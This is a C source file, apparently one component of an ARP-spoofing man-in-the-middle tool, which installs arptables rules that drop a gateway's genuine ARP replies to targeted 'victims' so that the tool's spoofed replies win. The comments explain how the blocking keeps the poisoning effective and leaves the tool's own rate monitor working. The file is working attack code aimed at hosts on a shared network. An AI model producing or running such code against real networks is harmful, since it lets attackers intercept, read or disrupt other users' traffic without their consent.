#include "utils_firewall.h"
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>

int setup_arp_block(unsigned char *gateway_mac, struct Victim *victims, int victim_count) {
    // In targeted mode, we use arptables OUTPUT rules to prevent the kernel from
    // forwarding the gateway's legitimate ARP replies to victims. This ensures our
    // spoofed replies are the only ones victims receive.
    //
    // IMPORTANT: We do NOT touch the INPUT chain. Dropping gateway ARP on INPUT
    // would blind our own heartbeat monitor thread, causing the adaptive rate to
    // drift to maximum and the spoofing to fade. The monitor MUST see gateway
    // traffic to function correctly.
    //
    // FORWARD chain rules are also ineffective for ARP since ARP is layer-2 and
    // only traverses FORWARD when br_netfilter is loaded (bridging mode).
    if (!gateway_mac || !victims || victim_count <= 0) return -1;

    char gw_mac_str[18];
    sprintf(gw_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
            gateway_mac[0], gateway_mac[1], gateway_mac[2],
            gateway_mac[3], gateway_mac[4], gateway_mac[5]);

    printf("[FIREWALL] Engaging ARP-Kill strategy (arptables OUTPUT only)...\n");

    for (int i = 0; i < victim_count; i++) {
        char victim_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, victims[i].ip, victim_ip, INET_ADDRSTRLEN);

        char cmd[1024];
        // OUTPUT only: prevent the kernel from forwarding gateway ARP replies
        // that arrive and would otherwise be relayed to victims via routing.
        snprintf(cmd, sizeof(cmd), 
                 "arptables -A OUTPUT --source-mac %s --destination-ip %s -j DROP 2>/dev/null || "
                 "/sbin/arptables -A OUTPUT --source-mac %s --destination-ip %s -j DROP 2>/dev/null || "
                 "/usr/sbin/arptables -A OUTPUT --source-mac %s --destination-ip %s -j DROP 2>/dev/null || true",
                 gw_mac_str, victim_ip,
                 gw_mac_str, victim_ip,
                 gw_mac_str, victim_ip);
        
        if (system(cmd) != 0) {
            fprintf(stderr, "[!] Warning: arptables not available for victim %s. Relying on active poisoning.\n", victim_ip);
        } else {
            printf("[+] Blocking outbound gateway ARP to %s.\n", victim_ip);
        }
    }

    return 0;
}

int cleanup_arp_block(void) {
    printf("[FIREWALL] Flushing arptables rules...\n");
    system("arptables -F 2>/dev/null || /sbin/arptables -F 2>/dev/null || /usr/sbin/arptables -F 2>/dev/null || true");
    return 0;
}
